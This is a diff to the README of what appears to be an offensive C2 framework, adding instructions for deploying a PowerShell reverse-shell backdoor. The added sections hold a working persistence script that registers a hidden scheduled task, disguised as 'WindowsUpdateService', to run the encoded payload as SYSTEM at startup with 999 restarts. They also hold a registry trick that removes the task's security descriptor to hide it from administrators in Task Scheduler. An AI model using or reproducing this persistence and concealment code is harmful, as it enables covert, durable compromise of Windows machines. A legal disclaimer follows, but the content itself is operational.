@@ -20,8 +20,10 @@
 - [🔥 Key Features](#-key-features)
 - [💻 Command Reference & Screenshot](#-command-reference--screenshot)
 - [🚀 Installation & Setup Guide](#-installation--setup-guide)
+- [🔐 Advanced Persistence & Payload Deployment](#-advanced-persistence--payload-deployment)
 - [🔌 Port Architecture & Network Layout](#-port-architecture--network-layout)
 - [⚙️ Advanced Configuration](#️-advanced-configuration)
+- [🎁 Gift to the Community – Hide Scheduled Tasks](#-gift-to-the-community--hide-scheduled-tasks)
 - [⚠️ Legal Disclaimer & Disclaimer of Liability](#️-legal-disclaimer--disclaimer-of-liability)
 
 ---
@@ -45,6 +47,9 @@
 | 🛠️ **One‑Click Payload Generator** | Produces stealthy Windows EXE (via .NET) with no console flash – ready for deployment. |
 | 📂 **File Transfer** | Upload/download files to/from compromised hosts with progress feedback. |
 | 💻 **Interactive PowerShell Shells** | Full interactive sessions with command history and color‑coded output. |
+| 🔄 **Auto‑Reconnect & Heartbeat** | The backdoor automatically reconnects if the server goes down, with exponential backoff and jitter. |
+| 👑 **NT AUTHORITY\SYSTEM Persistence** | Deploy a scheduled task that runs as SYSTEM, survives reboots, and auto‑restarts 999 times. |
+| 🕵️ **GUI Task Hiding** | Remove the Security Descriptor (SD) registry key to make the scheduled task invisible in the Task Scheduler GUI. |
 
 ---
 
@@ -117,6 +122,101 @@ You will be prompted to enter your **LHOST IP** (the public IP where the server 
 
 ---
 
+## 🔐 Advanced Persistence & Payload Deployment
+
+The `backdoor.ps1` included in the repository is a **fully persistent PowerShell client** that:
+- Establishes a **TLS‑encrypted reverse shell** back to your C2 server.
+- Sends **heartbeat** messages every 30 seconds to keep the connection alive.
+- **Auto‑reconnects** with exponential backoff and jitter if the server goes offline.
+- Handles **file uploads/downloads** and command execution natively.
+
+### 🚀 Deploying the Backdoor with SYSTEM Persistence
+
+1. **Edit the backdoor.ps1** – set your C2 server IP (port is **hardcoded to 443** – do **not** change it):
+   ```powershell
+   $server = "YOUR_IP"   # Change this to your C2 server's IP
+   ```
+
+2. **Convert the script to Base64** (this is required for the persistence task).  
+   On your Linux machine, run:
+   ```bash
+   cat backdoor.ps1 | iconv -t UTF-16LE | base64 -w 0 > payload.b64
+   ```
+   Or in PowerShell on Windows:
+   ```powershell
+   $bytes = [System.Text.Encoding]::Unicode.GetBytes((Get-Content .\backdoor.ps1 -Raw))
+   [Convert]::ToBase64String($bytes) | Out-File payload.b64
+   ```
+
+3. **Copy the Base64 string** into the persistence script (provided below).  
+   Replace `$encoded = "..."` with your Base64 payload.
+
+4. **Run the persistence script as Administrator** on the target machine (e.g., via a C2 shell with `upload` and then `powershell -ExecutionPolicy Bypass -File persist.ps1`).  
+   This will:
+   - Create a scheduled task named **`WindowsUpdateService`**.
+   - Run at startup **as NT AUTHORITY\SYSTEM** (highest privileges).
+   - Auto‑restart up to **999 times** if it fails.
+   - Start immediately after registration.
+
+```powershell
+# ============================================================
+# GOD LEVEL PERSISTENCE - NT AUTHORITY\SYSTEM
+# Clean version - No conflicting messages
+# ============================================================
+
+# === PASTE YOUR BASE64 PAYLOAD HERE ===
+$encoded = "JABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAUwBpAGw"
+
+# ============================================================
+# Remove any old tasks
+# ============================================================
+try {
+    Unregister-ScheduledTask -TaskName "WindowsUpdateService" -Confirm:$false -ErrorAction SilentlyContinue
+} catch {}
+
+# ============================================================
+# MAIN TASK - Runs at startup as SYSTEM (Forever)
+# ============================================================
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded"
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$trigger.Delay = "PT10S"
+$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet `
+    -AllowStartIfOnBatteries `
+    -DontStopIfGoingOnBatteries `
+    -StartWhenAvailable `
+    -Hidden `
+    -Compatibility Win8 `
+    -ExecutionTimeLimit (New-TimeSpan -Minutes 0) `
+    -RestartCount 999 `
+    -RestartInterval (New-TimeSpan -Minutes 1) `
+    -MultipleInstances IgnoreNew
+
+Register-ScheduledTask -TaskName "WindowsUpdateService" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force
+
+# ============================================================
+# START IMMEDIATELY
+# ============================================================
+Start-ScheduledTask -TaskName "WindowsUpdateService" -ErrorAction SilentlyContinue
+
+# ============================================================
+# VERIFICATION
+# ============================================================
+Write-Host "[+] GOD LEVEL PERSISTENCE INSTALLED!" -ForegroundColor Green
+Write-Host "[+] Task: WindowsUpdateService (SYSTEM)" -ForegroundColor Green
+Write-Host "[+] Registry Backup: HKLM\Run" -ForegroundColor Green
+Write-Host "[+] Auto-heals: 999 restart attempts" -ForegroundColor Green
+Write-Host "[+] Runs forever until PC shuts down" -ForegroundColor Green
+```
+
+### 🔍 Verifying the Task (Hidden from Users)
+Even if the task is hidden, you can still check it with PowerShell:
+```powershell
+Get-ScheduledTask -TaskName "WindowsUpdateService" | Select-Object TaskName, State, Enabled, LastRunTime, NextRunTime
+```
+
+---
+
 ## 🔌 Port Architecture & Network Layout
 
 | Port | Protocol | Service | Purpose |
@@ -144,6 +244,22 @@ If you're running headless (no `DISPLAY`), you can comment out the GUI launch li
 
 ---
 
+## 🎁 Gift to the Community – Hide Scheduled Tasks
+
+After deploying the persistence task, **make it invisible in the Task Scheduler GUI** (even for Administrators). This works only if you have **NT AUTHORITY\SYSTEM** privileges (e.g., from a SYSTEM shell).
+
+```powershell
+$taskName = "WindowsUpdateService"  # Must match the task name used above
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
+Remove-ItemProperty -Path $regPath -Name "SD" -ErrorAction Stop
+```
+
+**What this does:**  
+Removes the **Security Descriptor (SD)** registry value, which is used by the Task Scheduler to determine visibility. Once deleted, the task will no longer appear in the `taskschd.msc` GUI – it becomes accessible **only via PowerShell or API**, but will still run perfectly.  
+**Note:** This trick works only when executed as **SYSTEM**. If you run it as an admin user, it will fail because the registry key is protected.
+
+---
+
 ## ⚠️ Legal Disclaimer & Disclaimer of Liability
 
 > **IMPORTANT:** *This software is provided solely for educational purposes, authorized penetration testing, and red teaming engagements with explicit written permission from the system owner. Unauthorized access to computer systems is illegal and punishable by law.*
@@ -166,4 +282,3 @@ If you're running headless (no `DISPLAY`), you can comment out the GUI launch li
 <p align="center">
   <b>Made with ❤️ for the Red Team Community</b>
 </p>
-
